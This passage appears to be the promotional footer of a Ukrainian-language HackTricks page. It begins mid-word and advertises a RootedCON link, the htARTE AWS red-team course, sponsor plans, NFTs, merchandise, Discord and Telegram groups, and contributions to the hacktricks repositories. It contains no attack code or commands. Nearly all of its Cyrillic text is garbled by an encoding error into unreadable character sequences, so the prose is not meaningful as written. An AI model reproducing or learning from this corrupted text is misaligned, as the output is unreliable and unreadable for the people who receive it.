–≥–∞–ª—É–∑—ñ.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* –í–∏ –ø—Ä–∞—Ü—é—î—Ç–µ –≤ **–∫—ñ–±–µ—Ä–±–µ–∑–ø–µ—Ü—ñ**? –•–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏, —è–∫ –≤–∞—à–∞ **–∫–æ–º–ø–∞–Ω—ñ—è —Ä–µ–∫–ª–∞–º—É—î—Ç—å—Å—è –Ω–∞ HackTricks**? –∞–±–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –º–∞—Ç–∏ –¥–æ—Å—Ç—É–ø –¥–æ **–æ—Å—Ç–∞–Ω–Ω—å–æ—ó –≤–µ—Ä—Å—ñ—ó PEASS –∞–±–æ –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É PDF**? –ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –î—ñ–∑–Ω–∞–π—Ç–µ—Å—è –ø—Ä–æ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** [**üí¨**](https://emojipedia.org/speech-balloon/) [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –º–Ω–æ—é –Ω–∞ **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks](https://github.com/carlospolop/hacktricks) —Ç–∞ [—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—é hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
